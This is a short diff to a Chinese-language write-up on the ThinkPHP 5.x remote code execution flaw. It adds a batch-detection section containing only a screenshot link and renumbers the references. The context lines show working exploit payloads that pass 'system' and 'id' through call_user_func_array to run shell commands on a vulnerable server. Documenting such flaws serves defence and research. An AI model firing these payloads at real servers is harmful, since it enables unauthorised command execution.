@@ -68,7 +68,11 @@ s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&
 s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 ```
 
-## 0x04 参考
+## 0x04批量检测
+
+![run_Thinkphp_check](https://raw.githubusercontent.com/SecWiki/CMS-Hunter/master/ThinkPHP/ThinkPHP_5.X_%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/run_Thinkphp_check.png)
+
+## 0x05 参考
 
 [[漏洞分析]thinkphp 5.x全版本任意代码执行分析全记录](https://xz.aliyun.com/t/3570)
 
